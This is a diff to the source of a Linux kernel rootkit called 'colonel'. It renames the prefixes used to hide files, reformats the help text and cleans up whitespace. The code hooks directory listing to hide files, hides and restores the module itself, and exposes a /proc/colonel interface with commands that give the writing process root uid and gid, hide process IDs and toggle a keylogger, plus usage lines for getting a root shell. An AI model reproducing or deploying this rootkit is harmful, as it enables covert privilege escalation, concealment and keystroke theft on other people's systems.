@@ -75,7 +75,7 @@ void show_module(void) {
 	list_add(&THIS_MODULE->list, prev_module);		/* restores module entry */
 
 	restore = kobject_add(&THIS_MODULE->mkobj.kobj, 	/* restores kobject */
-						 THIS_MODULE->mkobj.kobj.parent, "rt");
+						 THIS_MODULE->mkobj.kobj.parent, "col");
 
 	hidden_module = !hidden_module;					/* sets module switch to 0*/
 }
@@ -114,47 +114,46 @@ u64 ino, unsigned d_type) {
 }
 
 static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
-	og_proc_filldir = filldir; 					/* stores the original filldir */
+	og_proc_filldir = filldir; 									/* stores the original filldir */
 	return og_proc_readdir(filp, dirent, new_proc_filldir);		/* passes the modified function */
 }
 
 static int new_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, 
 						  u64 ino, unsigned d_type) {
-	if (hidden_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) {	/* hides the file if prefix matches */
+	if (hidden_files && (!strncmp(name, "__col", 5) || !strncmp(name, "7-__col", 7))) {	/* hides the file if prefix matches */
 		return 0;
 	}
-	return og_fs_filldir(buf, name, namelen, offset, ino, d_type); /* invokes the original */
+	return og_fs_filldir(buf, name, namelen, offset, ino, d_type);	/* invokes the original */
 }
 
 static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
-	og_fs_filldir = filldir;	/* comparable to the /proc version */
+	og_fs_filldir = filldir;										/* comparable to the /proc version */
 	return og_fs_readdir(filp, dirent, new_fs_filldir);
 }
-/* reads /proc/colonel */
-static int read_colonel(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data) {
+
+static int read_colonel(char *buffer, char **buffer_location, off_t off, 
+						int count, int *eof, void *data) {			/* reads /proc/colonel */
 	int size;
 
 	sprintf(module_status, 
-"COLONEL-----------------------------------------\n\
-DESCRIPTION:\n\
-  hides files prefixed with __rt or 10-__rt and gives root access\n\n\
+"THE COLONEL--------------------------------------\n\
+  + hides files prefixed with __col or 7-__col\n\
+  + gives root access\n\n\
 USAGE:\n\
   From command line --\n\
   $ echo -n <command> >> /proc/colonel\n\n\
-  From rtcmd --\n\
-  $ ./rtcmd.py hp1337\n\n\
-  To get root access, give the \"hackbright\" command and\n\
-  then fork some shell from writing process.\n\
-  rtcmd.py does this if the second parameter is specified. --\n\
-  $ ./rtcmd.py hackbright /bin/bash\n\n\
+  From colcmd --\n\
+  $ ./colcmd.py hp1337\n\n\
+  To get root access --\n\
+  $ ./colcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
-  hackbright	- uid and gid 0 for writing process\n\
-  hpXXXX		- hides process id XXXX\n\
-  sp 			- shows last hidden process\n\
-  tls			- toggles keylogger on/off\n\
-  thf			- toggles hidden files\n\
-  mh 			- hide module\n\
-  ms 			- show module\n\n\
+  hackbright - uid and gid 0 for writing process\n\
+  hpXXXX - hides process id XXXX\n\
+  sp - shows last hidden process\n\
+  tls - toggles keylogger on/off\n\
+  thf - toggles hidden files\n\
+  mh - hide module\n\
+  ms - show module\n\n\
 STATUS-------------------------------------------\n\
   keylogger: %d\n\
   hidden files: %d\n\
@@ -163,7 +162,7 @@ STATUS-------------------------------------------\n\
   -----------------------------------------------\n", key_logger, hidden_files, current_pid, hidden_module);
 
 	size = strlen(module_status);
-/* WTF */
+
 	if (off >= size) {
 		return 0;
 	}
@@ -203,7 +202,6 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 
 	} else if (!strncmp(buff, "ms", MIN(2, count))) {		/* show module (rootkit) */
 		show_module();
-
 	}
 	
     return count;
@@ -274,7 +272,6 @@ static int __init fs_init(void) {
 	
 	return 1;
 }
-
 
 /* MODULE INIT/EXIT */
 static int __init rootkit_init(void) {
